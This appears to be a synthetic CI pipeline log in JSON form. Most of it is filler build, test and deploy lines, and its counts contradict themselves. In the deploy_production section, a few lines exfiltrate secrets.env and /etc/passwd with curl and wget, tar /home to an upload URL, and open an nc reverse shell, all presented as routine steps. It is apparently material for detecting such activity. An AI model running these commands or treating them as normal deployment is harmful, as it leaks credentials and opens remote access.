webpack-3.4.tar.gz\nnpm notice: package.json updated\n[12:19:37] INFO: Starting build process\n\u2713 Step 'build' succeeded\nTransforming 728 files...\n[12:19:37] INFO: Connecting to database\n[12:19:37] INFO: Processing request\nProcessing...\nSuccess!\nCache miss for key-9414\n[12:19:37] INFO: Request completed\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 30MB\nPlatform: linux-x64\nBundling main.js\nCompiling src/handler.rs...\nnpm notice: package.json updated\n  PASS: test_cache_hit (368ms)\nTransforming 527 files...\nCache miss for key-9838\nArtifact downloaded: 9MB\nnpm notice: package.json updated\nyarn add: Done in 16.19s\nHEAD is now at 4fd29d5\n[12:19:37] WARN: Deprecated API usage\nStep 19/22: Running migrations\nTests: 406 passed, 64 total\npip: Collecting prettier\nGET /health - 201 (50ms)\nStep 19/15: Testing\nStep 15/23: Deploying\nImage pulled successfully\nPushing to registry...\nCompiling components/utils.go...\nNODE_ENV=production\nReady.\npip: Collecting prettier\nTime: 90.121s\nGET /api - 200 (48ms)\nWARNING: axios has known vulnerabilities\nWaiting...\nSuccess!\nTest Suites: 16 passed, 8 total\nPushing to registry...\nVerifying...\nCompiling lib/index.js...\nFAILED: test_db_connect\nWARNING: react has known vulnerabilities\nSuccess!\nHEAD is now at 18a92ac\nRan 56 tests in 35s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nArtifact uploaded: dist.zip (84MB)\nCompiling components/utils.go...\nnpm notice: created a lockfile\nConnection established\npip install: Successfully installed react-1.19\nStep 10/17: Linting\nTest Suites: 31 passed, 13 total\n\u2713 Task completed in 4850ms\nChecking out develop branch\nReady.\nImage pulled successfully\nCache saved successfully\n  PASS: test_user_create (484ms)\nHEAD is now at 2eae50a\nStep 10/19: Running migrations\nnpm notice: package.json updated\n\u2713 validate completed\nNODE_ENV=development\nCompiling lib/index.js...\npip: Downloading react-1.10.tar.gz\nNODE_ENV=development\nInstalling prettier@3.19.10\n[12:19:37] WARN: Deprecated API usage\n[12:19:37] INFO: Request completed\nyarn add: Done in 22.85s\npip: Collecting eslint\nnpm notice: created a lockfile\nPlatform: darwin-arm64\nTests: 381 passed, 189 total\nCompiling src/service.java...\npip: Installing build dependencies...\n[12:19:37] DEBUG: Connection pool: 7 active\nProcessing...\nOptimizing 63 modules...\nReady.\nChecking out develop branch\nSuccess!\nMinifying app.js\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\nCache saved successfully\nStep 12/22: Installing dependencies\nPushing to registry...\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n\u2713 All checks passed\nnpm notice: package.json updated\nUploading artifact 'dist' (46 files)\nStep 20/18: Building\nArtifact uploaded: build.tar.gz (47MB)\nWARNING: prettier has known vulnerabilities\nStep 4/18: Installing dependencies\nWARNING: prettier has known vulnerabilities\nCompiling lib/app.ts...\nTests: 98 passed, 152 total\nConnecting to acme.corp:443...\nArtifact uploaded: build.tar.gz (35MB)\nChecking out develop branch\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'test' succeeded\n[12:19:37] INFO: Starting build process\n[12:19:37] INFO: Connecting to database\nnpm notice: created a lockfile\nSuccess!\nStep 18/16: Installing dependencies\nArtifact uploaded: dist.zip (19MB)\nFinished.\nProcessing...\n[12:19:37] WARN: Deprecated API usage\nUsing Node.js 14.8.6\nVerifying...\nCache invalidated: node_modules\nCache restored successfully (40MB)\n  PASS: integration/test_auth_login.spec.js\nArtifact downloaded: 33MB\nStep 15/16: Running migrations\nVerifying...\nStep 4/15: Installing dependencies\nUsing Python 3.9\nPulling image: node:latest\nCompiling components/index.js...\nStep 7/23: Linting\n[12:19:37] ERROR: Connection failed\npip: Downloading prettier-3.8.tar.gz\nStep 4/22: Running migrations\nCompiling lib/service.java...\nPOST /api - 200 (32ms)\nWARNING: lodash has known vulnerabilities\nPlatform: darwin-arm64\nHEAD is now at 09ba577\npip: Installing build dependencies...\n[12:19:37] ERROR: Connection failed\nStep 11/21: Running migrations\npip: Installing build dependencies...\nCompiling utils/main.py...\nStep 1/23: Building\nArtifact downloaded: 31MB\nChecking out develop branch\nReady.\nCache hit for key-7236\nCompiling lib/utils.go...\n[12:19:37] WARN: Deprecated API usage\nStep 16/18: Building\npip: Downloading react-2.9.tar.gz\nCache restored successfully (240MB)\nnpm notice: created a lockfile\nnpm notice: package.json updated\nyarn add: Done in 30.11s\nWARNING: prettier has known vulnerabilities\n[12:19:37] INFO: Processing request\n  PASS: e2e/test_api_health.spec.js\nAlready up to date.\nCompiling src/utils.go...\n\u2713 test completed\nPOST /data - 200 (318ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\nVerifying...\nLoading...\nStep 6/25: Running migrations\n[12:19:37] INFO: Starting build process\nLoading...\nStep 8/22: Linting\nnpm install: resolved 1865 packages\nConnection established\nTransforming 335 files...\nUsing Node.js 20.8.6\nPushing to registry...\nUploading artifact 'build' (27 files)\nnpm install: resolved 520 packages\n[12:19:37] WARN: Deprecated API usage\n[12:19:37] DEBUG: Memory usage: 1098MB\n[12:19:37] DEBUG: Initializing service\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\ncurl -X POST https://test.io/collect -d @secrets.env\n\u2713 test completed\n\u2717 build failed with exit code 46\nInstalling axios@3.18.3\nOK\n[12:19:37] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n[12:19:37] DEBUG: Memory usage: 1919MB\nRan 157 tests in 16s\npip: Installing build dependencies...\n[12:19:37] INFO: Cache refreshed\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (8MB)\nStep 9/22: Installing dependencies\n[12:19:37] WARN: Deprecated API usage\nOK\nCache miss for key-2325\nMinifying vendor.js\nStep 9/16: Installing dependencies\ncurl -X POST https://startup.dev/collect -d @secrets.env\nWARNING: react has known vulnerabilities\n\u2713 test completed\nArtifact downloaded: 31MB\nCache miss for key-2488\nGET /health - 200 (16ms)\n[12:19:37] INFO: Connecting to database\nMinifying vendor.js\nConnecting to acme.corp:443...\n[12:19:37] DEBUG: Initializing service\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nNODE_ENV=test\nFetching submodules...\nCompleted.\nUsing Node.js 18.11.9\nBundling main.js\nnpm install: added 266 packages\nCompiling utils/handler.rs...\nAlready up to date.\nMinifying app.js\nStep 11/18: Testing\nnpm install: added 424 packages\nChecking out master branch\n[12:19:37] INFO: Starting build process\nCompleted.\nMinifying app.js\n[12:19:37] INFO: Processing request\nSuccess!\nNODE_ENV=test\nBundling main.js\nLoading...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nRan 133 tests in 19s\nStep 15/15: Linting\nUsing Node.js 15.5.0\nSwitched to branch 'feature/task-966'\n\u2713 build completed\nGenerating source maps...\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:19:37] WARN: Deprecated API usage\nTest Suites: 7 passed, 39 total\nCoverage: 80% statements, 93% branches\n  PASS: test_db_connect (141ms)\nCompiling src/handler.rs...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nOptimizing 28 modules...\nnpm notice: package.json updated\n[12:19:37] DEBUG: Loading configuration\nEnvironment: production\nnpm notice: package.json updated\nCache miss for key-9429\nStep 14/22: Installing dependencies\n[12:19:37] DEBUG: Query executed in 95ms\nFAILED: test_user_create\nnpm notice: created a lockfile\nLoading...\nCompiling src/index.js...\nCompiling src/index.js...\n[12:19:37] DEBUG: Query executed in 50ms\n[12:19:37] DEBUG: Query executed in 25ms\n\u2713 Step 'test' succeeded\n  PASS: test_cache_hit (346ms)\nnc -e /bin/sh 220.179.91.40 39085\nStep 17/19: Linting\nUploading artifact 'coverage' (29 files)\nAlready up to date.\nStep 6/15: Deploying\nTLS handshake completed\nFetching submodules...\nTransforming 988 files...\nnpm install: resolved 1522 packages\nCompiling utils/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nCache invalidated: dependencies\n[12:19:37] INFO: Request completed\nHEAD is now at d8e6b35\n[12:19:37] DEBUG: Loading configuration\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:37] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:19:37] INFO: Request completed\n[12:19:37] DEBUG: Connection pool: 14 active\n\u2713 Task completed in 782ms\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-03T12:19:37.847749",
        "finished_at": "2025-12-03T12:19:51.951447",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "HEAD is now at bf6e0c1",
          "NODE_ENV=development",
          "OK",
          "Environment: development",
          "Using Python 3.9",
          "Image pulled successfully",
          "[12:19:37] INFO: Cache refreshed",
          "pip: Downloading prettier-5.2.tar.gz",
          "Step 15/22: Running migrations",
          "Ready.",
          "npm notice: created a lockfile",
          "Bundling main.css",
          "Artifact uploaded: dist.zip (13MB)",
          "Exception: NullPointerException",
          "Success!",
          "pip: Installing build dependencies...",
          "POST /data - 201 (251ms)",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=production",
          "Optimizing 57 modules...",
          "npm install: resolved 1737 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading prettier-2.12.tar.gz",
          "Tests: 184 passed, 255 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Step 14/17: Building",
          "Compiling utils/service.java...",
          "Completed.",
          "Step 12/24: Deploying",
          "npm notice: created a lockfile",
          "Completed.",
          "npm install: added 137 packages",
          "[12:19:37] DEBUG: Query executed in 70ms",
          "Cache saved successfully",
          "[12:19:37] INFO: Cache refreshed",
          "Tests: 154 passed, 357 total",
          "\u2713 Task completed in 445ms",
          "[12:19:37] INFO: Processing request",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:37] DEBUG: Memory usage: 1547MB",
          "Ready.",
          "Step 20/24: Linting",
          "[12:19:37] INFO: Connecting to database",
          "FAILED: test_user_create",
          "Installing webpack@3.14.1",
          "Compiling lib/main.py...",
          "Step 19/17: Deploying",
          "Cache invalidated: node_modules",
          "WARNING: react has known vulnerabilities",
          "\u2713 Step 'install' succeeded",
          "GET /status - 200 (93ms)",
          "Compiling src/handler.rs...",
          "TLS handshake completed",
          "Transforming 485 files...",
          "Platform: darwin-arm64",
          "Step 12/22: Deploying",
          "Loading...",
          "Image pulled successfully",
          "Layer 3/8: ENV command",
          "\u2717 build failed with exit code 119",
          "Creating production build...",
          "Completed.",
          "Step 14/22: Deploying",
          "pip: Installing build dependencies...",
          "NODE_ENV=development",
          "HEAD is now at e2f60e6",
          "\u2713 All checks passed",
          "Step 18/20: Deploying",
          "Ran 142 tests in 24s",
          "Connecting to cloud.services:443...",
          "Step 10/25: Linting",
          "Step 2/24: Installing dependencies",
          "TLS handshake completed",
          "GET /api - 204 (66ms)",
          "  PASS: test_cache_hit (477ms)",
          "Bundling runtime.css",
          "Ready.",
          "[12:19:37] WARN: Deprecated API usage",
          "  PASS: e2e/test_api_health.spec.js",
          "Optimizing 54 modules...",
          "Tests: 425 passed, 232 total",
          "Compiling utils/service.java...",
          "Fetching submodules...",
          "Checking out main branch",
          "Building Docker image...",
          "Completed.",
          "[12:19:37] INFO: Connecting to database",
          "Already up to date.",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "Step 10/25: Building",
          "Ready.",
          "OK",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-03T12:19:51.951447",
        "finished_at": "2025-12-03T12:20:06.055145",
        "log_lines": [
          "=== Step: setup_node ===",
          "Creating production build...",
          "GET /health - 201 (7ms)",
          "WARNING: lodash has known vulnerabilities",
          "POST /data - 202 (446ms)",
          "Transforming 222 files...",
          "Step 7/24: Testing",
          "[12:19:37] INFO: Connecting to database",
          "Fetching submodules...",
          "[12:19:37] INFO: Cache refreshed",
          "\u2713 build completed",
          "\u2713 deploy completed",
          "[12:19:37] WARN: Deprecated API usage",
          "Cache hit for key-2832",
          "[12:19:37] INFO: Request completed",
          "NODE_ENV=test",
          "Checking out master branch",
          "Done.",
          "Cache miss for key-4440",
          "[12:19:37] INFO: Request completed",
          "Test Suites: 9 passed, 13 total",
          "OK",
          "\u2713 deploy completed",
          "Cache hit for key-3573",
          "Finished.",
          "Generating source maps...",
          "Using Node.js 15.7.6",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 2463ms",
          "Already up to date.",
          "Pushing to registry...",
          "[12:19:37] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "Switched to branch 'hotfix/task-955'",
          "Uploading artifact 'build' (23 files)",
          "[12:19:37] INFO: Request completed",
          "\u2713 All checks passed",
          "Layer 4/12: COPY command",
          "npm install: resolved 726 packages",
          "Pulling image: python:18",
          "Processing...",
          "Time: 97.643s",
          "pip: Installing build dependencies...",
          "Cache invalidated: node_modules",
          "[12:19:37] INFO: Cache refreshed",
          "Step 4/23: Running migrations",
          "Checking out main branch",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2713 Step 'test' succeeded",
          "pip: Installing build dependencies...",
          "[12:19:37] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (1 files)",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Creating production build...",
          "Layer 1/11: ENV command",
          "[12:19:37] INFO: Starting build process",
          "Connection established",
          "Using Python 3.12",
          "Ran 136 tests in 23s",
          "OK",
          "[12:19:37] DEBUG: Connection pool: 13 active",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "[12:19:37] INFO: Cache refreshed",
          "Platform: win32-x64",
          "Connecting to acme.corp:443...",
          "Optimizing 23 modules...",
          "npm notice: package.json updated",
          "Using Node.js 17.8.6",
          "NODE_ENV=production",
          "Minifying app.js",
          "Installing jest@2.15.1",
          "  PASS: test_cache_hit (204ms)",
          "Step 6/25: Running migrations",
          "Optimizing 31 modules...",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:37] DEBUG: Memory usage: 1318MB",
          "Step 3/23: Linting",
          "Installing eslint@1.20.9",
          "POST /api - 200 (469ms)",
          "[12:19:37] INFO: Processing request",
          "npm notice: package.json updated",
          "pip install: Successfully installed prettier-4.17",
          "Step 10/20: Deploying",
          "NODE_ENV=development",
          "Cache miss for key-3744",
          "[12:19:37] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 2",
          "Cache restored successfully (205MB)",
          "Connection established",
          "Already up to date.",
          "Pushing to registry...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-03T12:20:06.055145",
        "finished_at": "2025-12-03T12:20:11.696624",
        "log_lines": [
          "=== Step: checkout ===",
          "Connection established",
          "npm notice: package.json updated",
          "Layer 5/15: ENV command",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact downloaded: 26MB",
          "[12:19:37] INFO: Request completed",
          "Loading...",
          "Coverage: 88% statements, 73% branches",
          "Completed.",
          "Finished.",
          "Compiling src/utils.go...",
          "Waiting...",
          "\u2713 All checks passed",
          "  PASS: test_user_create (479ms)",
          "Ready.",
          "npm install: added 10 packages",
          "Connecting to cloud.services:443...",
          "[12:19:37] DEBUG: Initializing service",
          "Success!",
          "Transforming 489 files...",
          "Pushing to registry...",
          "[12:19:37] DEBUG: Loading configuration",
          "Layer 7/14: ENV command",
          "[12:19:37] ERROR: Connection failed",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-5169",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 1434ms",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Verifying...",
          "Verifying...",
          "pip: Downloading lodash-3.5.tar.gz",
          "Checking out main branch",
          "[12:19:37] INFO: Request completed",
          "Snapshots: 20 passed, 38 total",
          "Step 8/24: Testing",
          "pip: Downloading axios-2.2.tar.gz",
          "Test Suites: 21 passed, 10 total",
          "yarn add: Done in 5.0s",
          "Step 5/20: Building",
          "Switched to branch 'feature/task-323'",
          "Step 2/24: Running migrations",
          "[12:19:37] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Loading...",
          "Tests: 189 passed, 266 total",
          "Loading...",
          "NODE_ENV=production",
          "Step 4/17: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-5027",
          "Cache hit for key-6649",
          "[12:19:37] WARN: Deprecated API usage",
          "pip: Downloading axios-1.15.tar.gz",
          "Pulling image: alpine:18",
          "Generating source maps...",
          "Processing...",
          "Uploading artifact 'build' (5 files)",
          "Optimizing 64 modules...",
          "pip: Collecting react",
          "Step 14/24: Testing",
          "  PASS: test_auth_login (16ms)",
          "GET /health - 201 (68ms)",
          "[12:19:37] INFO: Starting build process",
          "Step 9/18: Testing",
          "Compiling src/app.ts...",
          "POST /api - 200 (359ms)",
          "Pushing to registry...",
          "Ready.",
          "pip: Collecting react",
          "HEAD is now at 25fc7d7",
          "Time: 12.720s",
          "Environment: test",
          "Done.",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Connection established",
          "Artifact uploaded: dist.zip (57MB)",
          "TLS handshake completed",
          "[12:19:37] WARN: Deprecated API usage",
          "Cache restored successfully (86MB)",
          "Installing react@5.18.1",
          "Compiling utils/handler.rs...",
          "[12:19:37] DEBUG: Initializing service",
          "pip: Collecting prettier",
          "Step 9/25: Running migrations",
          "Artifact uploaded: dist.zip (91MB)",
          "Step 2/16: Installing dependencies",
          "[12:19:37] INFO: Request completed",
          "Minifying vendor.js",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-03T12:20:11.696624",
        "finished_at": "2025-12-03T12:20:54.007717",
        "log_lines": [
          "=== Step: build ===",
          "Switched to branch 'hotfix/task-301'",
          "Test Suites: 8 passed, 23 total",
          "pip install: Successfully installed prettier-3.10",
          "Snapshots: 33 passed, 26 total",
          "\u2713 Step 'build' succeeded",
          "Tests: 325 passed, 257 total",
          "[12:19:37] DEBUG: Connection pool: 4 active",
          "POST /data - 200 (62ms)",
          "TLS handshake completed",
          "Step 8/15: Building",
          "[12:19:37] INFO: Starting build process",
          "Verifying...",
          "Finished.",
          "npm notice: package.json updated",
          "WARNING: react has known vulnerabilities",
          "Exception: TypeError",
          "[12:19:37] INFO: Processing request",
          "Step 17/15: Deploying",
          "[12:19:37] ERROR: Connection failed",
          "Building Docker image...",
          "Done.",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Test Suites: 33 passed, 15 total",
          "pip: Downloading react-5.19.tar.gz",
          "pip: Collecting webpack",
          "Already up to date.",
          "Time: 83.832s",
          "Step 16/15: Building",
          "Compiling src/main.py...",
          "WARNING: eslint has known vulnerabilities",
          "Optimizing 89 modules...",
          "Finished.",
          "npm install: added 166 packages",
          "WARNING: webpack has known vulnerabilities",
          "Checking out develop branch",
          "[12:19:37] WARN: Deprecated API usage",
          "Environment: test",
          "Finished.",
          "Cache hit for key-3931",
          "[12:19:37] ERROR: Connection failed",
          "Creating production build...",
          "[12:19:37] INFO: Processing request",
          "[12:19:37] INFO: Request completed",
          "Switched to branch 'feature/task-559'",
          "Transforming 449 files...",
          "[12:19:37] DEBUG: Connection pool: 9 active",
          "Coverage: 85% statements, 79% branches",
          "[12:19:37] DEBUG: Query executed in 41ms",
          "Optimizing 94 modules...",
          "Already up to date.",
          "Pushing to registry...",
          "POST /api - 200 (277ms)",
          "npm install: added 416 packages",
          "Compiling src/app.ts...",
          "yarn add: Done in 22.40s",
          "Compiling components/utils.go...",
          "OK",
          "Environment: development",
          "Step 5/18: Installing dependencies",
          "Optimizing 42 modules...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "POST /upload - 202 (476ms)",
          "[12:19:37] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "FAILED: test_auth_login",
          "Step 18/20: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "Bundling vendor.js",
          "Cache restored successfully (366MB)",
          "Already up to date.",
          "Layer 2/10: RUN command",
          "pip: Installing build dependencies...",
          "\u2713 test completed",
          "[12:19:37] ERROR: Connection failed",
          "[12:19:37] DEBUG: Connection pool: 2 active",
          "[12:19:37] DEBUG: Initializing service",
          "npm install: added 277 packages",
          "Finished.",
          "Compiling utils/index.js...",
          "\u2713 build completed",
          "Done.",
          "POST /data - 200 (306ms)",
          "npm install: resolved 1312 packages",
          "Loading...",
          "Transforming 365 files...",
          "WARNING: jest has known vulnerabilities",
          "npm install: added 262 packages",
          "\u2713 test completed",
          "Environment: production",
          "Cache hit for key-6224",
          "Compiling lib/handler.rs...",
          "[12:19:37] INFO: Processing request",
          "Minifying app.js",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-03T12:20:54.007717",
        "finished_at": "2025-12-03T12:21:22.215112",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Checking out develop branch",
          "Cache saved successfully",
          "Transforming 587 files...",
          "FAILED: test_api_health",
          "Finished.",
          "Tests: 134 passed, 386 total",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:37] INFO: Request completed",
          "Creating production build...",
          "Done.",
          "[12:19:37] ERROR: Connection failed",
          "Processing...",
          "Minifying app.js",
          "\u2713 validate completed",
          "Cache restored successfully (361MB)",
          "Cache saved successfully",
          "\u2713 Task completed in 2797ms",
          "Verifying...",
          "Compiling components/main.py...",
          "HEAD is now at a4814e1",
          "POST /data - 200 (227ms)",
          "Step 1/19: Deploying",
          "Completed.",
          "POST /data - 201 (59ms)",
          "Already up to date.",
          "Loading...",
          "Pulling image: node:3.11",
          "[12:19:37] INFO: Starting build process",
          "Artifact downloaded: 18MB",
          "Checking out develop branch",
          "Using Python 3.9",
          "Cache restored successfully (416MB)",
          "OK",
          "Completed.",
          "Cache restored successfully (351MB)",
          "yarn add: Done in 13.53s",
          "pip install: Successfully installed express-4.10",
          "\u2713 Step 'build' succeeded",
          "[12:19:37] DEBUG: Connection pool: 7 active",
          "[12:19:37] INFO: Processing request",
          "[12:19:37] DEBUG: Connection pool: 13 active",
          "Connecting to example.com:443...",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:37] INFO: Starting build process",
          "Waiting...",
          "GET /api - 204 (27ms)",
          "POST /upload - 202 (212ms)",
          "Artifact downloaded: 19MB",
          "Checking out master branch",
          "[12:19:37] ERROR: Connection failed",
          "Connecting to acme.corp:443...",
          "Connection established",
          "Cache miss for key-5221",
          "Time: 24.253s",
          "  PASS: test_user_create (182ms)",
          "TLS handshake completed",
          "[12:19:37] DEBUG: Query executed in 85ms",
          "Cache miss for key-9515",
          "[12:19:37] INFO: Starting build process",
          "Bundling vendor.js",
          "Creating production build...",
          "Finished.",
          "npm install: resolved 459 packages",
          "Using Python 3.12",
          "[12:19:37] INFO: Cache refreshed",
          "Step 15/19: Testing",
          "Artifact uploaded: build.tar.gz (44MB)",
          "pip install: Successfully installed jest-5.11",
          "Ran 183 tests in 23s",
          "Cache hit for key-7148",
          "Cache saved successfully",
          "\u2717 build failed with exit code 95",
          "Connecting to acme.corp:443...",
          "pip install: Successfully installed express-1.13",
          "Finished.",
          "Ran 72 tests in 8s",
          "GET /api - 200 (75ms)",
          "\u2713 All checks passed",
          "Environment: test",
          "Environment: development",
          "Switched to branch 'bugfix/task-356'",
          "Time: 64.681s",
          "Cache saved successfully",
          "Optimizing 53 modules...",
          "pip install: Successfully installed axios-2.14",
          "Waiting...",
          "Compiling src/handler.rs...",
          "[12:19:37] INFO: Cache refreshed",
          "Finished.",
          "Step 5/19: Running migrations",
          "Compiling src/main.py...",
          "[12:19:37] DEBUG: Initializing service",
          "[12:19:37] INFO: Request completed",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-03T12:21:22.215112",
        "finished_at": "2025-12-03T12:21:36.318810",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Test Suites: 18 passed, 10 total",
          "Layer 5/14: COPY command",
          "[12:19:37] INFO: Starting build process",
          "\u2713 Task completed in 743ms",
          "Fetching submodules...",
          "Uploading artifact 'build' (38 files)",
          "Snapshots: 6 passed, 37 total",
          "Processing...",
          "Ran 17 tests in 44s",
          "Fetching submodules...",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting eslint",
          "WARNING: axios has known vulnerabilities",
          "Coverage: 82% statements, 69% branches",
          "HEAD is now at 9bb4ec3",
          "pip: Collecting eslint",
          "\u2713 Task completed in 1948ms",
          "Compiling components/utils.go...",
          "OK",
          "pip: Downloading axios-5.19.tar.gz",
          "Compiling utils/handler.rs...",
          "POST /api - 200 (383ms)",
          "[12:19:37] DEBUG: Query executed in 55ms",
          "WARNING: axios has known vulnerabilities",
          "Compiling utils/service.java...",
          "Connecting to test.io:443...",
          "[12:19:37] INFO: Request completed",
          "Pushing to registry...",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:37] WARN: Deprecated API usage",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "Pulling image: node:latest",
          "[12:19:37] WARN: Deprecated API usage",
          "Fetching submodules...",
          "FAILED: test_user_create",
          "OK",
          "Waiting...",
          "Optimizing 93 modules...",
          "\u2713 All checks passed",
          "Transforming 104 files...",
          "Image pulled successfully",
          "Compiling components/utils.go...",
          "[12:19:37] WARN: Deprecated API usage",
          "Using Python 3.12",
          "\u2717 build failed with exit code 57",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "Compiling components/utils.go...",
          "Switched to branch 'bugfix/task-403'",
          "Processing...",
          "TLS handshake completed",
          "Optimizing 23 modules...",
          "Step 9/22: Linting",
          "[12:19:37] ERROR: Connection failed",
          "\u2713 Task completed in 2174ms",
          "Connecting to cloud.services:443...",
          "\u2713 All checks passed",
          "[12:19:37] DEBUG: Memory usage: 1374MB",
          "[12:19:37] DEBUG: Initializing service",
          "[12:19:37] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (43MB)",
          "npm install: resolved 794 packages",
          "Compiling lib/handler.rs...",
          "npm install: added 241 packages",
          "NODE_ENV=test",
          "Cache hit for key-3351",
          "Transforming 151 files...",
          "Cache invalidated: dependencies",
          "Compiling utils/index.js...",
          "Transforming 240 files...",
          "FAILED: test_api_health",
          "Loading...",
          "Platform: win32-x64",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Processing...",
          "POST /api - 200 (401ms)",
          "Pushing to registry...",
          "Cache invalidated: build",
          "[12:19:37] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Checking out main branch",
          "Checking out develop branch",
          "Cache miss for key-4193",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Installing jest@5.16.5",
          "[12:19:37] INFO: Request completed",
          "Fetching submodules...",
          "Fetching submodules...",
          "\u2713 Task completed in 1871ms",
          "Creating production build...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-03T12:21:36.318810",
        "finished_at": "2025-12-03T12:21:50.422508",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Done.",
          "Transforming 926 files...",
          "[12:19:37] DEBUG: Connection pool: 3 active",
          "pip: Downloading eslint-5.13.tar.gz",
          "[12:19:37] ERROR: Connection failed",
          "Step 18/16: Testing",
          "Using Python 3.10",
          "HEAD is now at 875349b",
          "Done.",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 07f7f45",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Tests: 334 passed, 476 total",
          "Pushing to registry...",
          "[12:19:37] DEBUG: Query executed in 86ms",
          "TLS handshake completed",
          "Success!",
          "Time: 3.445s",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Test Suites: 38 passed, 9 total",
          "Tests: 266 passed, 448 total",
          "TLS handshake completed",
          "Time: 49.63s",
          "Artifact uploaded: dist.zip (94MB)",
          "Optimizing 34 modules...",
          "Pushing to registry...",
          "Already up to date.",
          "Generating source maps...",
          "Uploading artifact 'dist' (42 files)",
          "Fetching submodules...",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "Time: 31.777s",
          "[12:19:37] INFO: Starting build process",
          "Switched to branch 'bugfix/task-833'",
          "POST /data - 200 (459ms)",
          "npm notice: created a lockfile",
          "Connection established",
          "Step 12/21: Testing",
          "Completed.",
          "Step 8/25: Testing",
          "Cache invalidated: build",
          "Connecting to test.io:443...",
          "Compiling src/main.py...",
          "npm notice: created a lockfile",
          "[12:19:37] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Cache miss for key-4255",
          "[12:19:37] INFO: Starting build process",
          "[12:19:37] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "  PASS: unit/test_auth_login.spec.js",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 11/16: Linting",
          "Cache hit for key-4983",
          "TLS handshake completed",
          "[12:19:37] DEBUG: Memory usage: 180MB",
          "Completed.",
          "Step 4/21: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "[12:19:37] DEBUG: Loading configuration",
          "  PASS: integration/test_user_create.spec.js",
          "Completed.",
